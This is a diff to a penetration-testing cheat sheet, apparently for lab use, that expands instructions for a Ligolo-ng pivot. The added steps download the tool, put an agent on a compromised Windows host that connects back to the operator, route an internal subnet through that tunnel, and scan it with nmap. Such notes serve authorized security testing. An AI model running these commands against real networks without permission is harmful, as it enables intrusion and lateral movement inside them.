@@ -56,26 +56,49 @@ curl --socks5-hostname 127.0.0.1:{{LPORT}} -m 5 -i 'http://{{RHOST}}:{{RPORT}}/'
 
 ## Ligolo-ng tunnel
 
-Use when whole tools (nmap, WinRM clients) must reach an internal range through one pivot. Run the proxy as root on Kali and the agent on the pivot:
+Use when whole tools (nmap, WinRM clients) must reach an internal range through one pivot. Get both release binaries on Kali first:
 
 ```bash
-# Operator machine
-sudo ./proxy -selfcert
+mkdir -p /home/kali/tools/ligolo-ng /home/kali/tools/binaries
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9.2/ligolo-ng_v0.9.2_linux_amd64.tar.gz -O /home/kali/tools/ligolo-ng/proxy.tar.gz
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9.2/ligolo-ng_v0.9.2_windows_amd64.zip -O /home/kali/tools/ligolo-ng/agent.zip
+unzip -jo /home/kali/tools/ligolo-ng/agent.zip agent.exe -d /home/kali/tools/binaries
+tar xzf /home/kali/tools/ligolo-ng/proxy.tar.gz -C /home/kali/tools/ligolo-ng proxy
 ```
 
+`proxy` runs on Kali; `agent.exe` goes to the Windows pivot (about 10 MB — verify the size after unpacking). TODO: verify the current release before relying on pinned paths. Transfer the agent with [Evil-WinRM's upload](services/remote-access#winrm) or a [Windows download](shells/file-transfers#downloading-on-windows).
+
+Start the proxy as root on Kali and keep it running; it listens on 11601/tcp by default:
+
+```bash
+sudo /home/kali/tools/ligolo-ng/proxy -selfcert
+```
+
+From a session on the pivot, connect the agent back to Kali's reachable address:
+
 ```powershell
-# Pivot machine
 .\agent.exe -connect {{LHOST}}:11601 -ignore-cert
 ```
 
-In the proxy prompt, `session`, select the pivot, then `start` to bring the `ligolo` interface up. Route the internal range through it, then verify:
+In the proxy prompt, pick the connected agent and start the tunnel interface:
+
+```
+session
+start
+ifconfig
+```
+
+`session` lists connected agents; select the pivot's. `start` brings the `ligolo` TUN interface up on Kali. `ifconfig` shows the pivot's own interfaces — use it to pick the internal subnet for the route.
+
+In a second Kali terminal, route the internal range through the interface and verify:
 
 ```bash
 sudo ip route add 10.10.139.0/24 dev ligolo
-ping 10.10.139.142
+ping 10.10.139.141
+sudo nmap -sn 10.10.139.0/24
 ```
 
-Replace the example range with the pivot's own subnet from `ipconfig`. [Ligolo-ng](https://github.com/nicocha30/ligolo-ng).
+Replace the example range with the pivot's internal subnet. Traffic now routes natively through the tunnel — no proxychains wrapper. Teardown is `sudo ip route del 10.10.139.0/24 dev ligolo` and `stop` in the proxy. [Ligolo-ng](https://github.com/nicocha30/ligolo-ng).
 
 ## Scan through a tunnel
 
@@ -88,7 +111,7 @@ sudo nmap -sS -p- -Pn -n 10.10.139.142 -oA ms02-tcp
 With a SOCKS proxy instead, wrap the tool and force full connect scans; ping and SYN scans do not traverse SOCKS:
 
 ```bash
-proxychains nmap -sT -Pn -p 445,5985 {{MS02}}
+proxychains nmap -sT -Pn -p 445,5985 {{RHOST}}
 ```
 
 Confirm reachability per host before interpreting a scan as complete. [Nmap scan techniques](https://nmap.org/book/man-port-scanning-techniques.html), [proxychains](https://github.com/haad/proxychains).
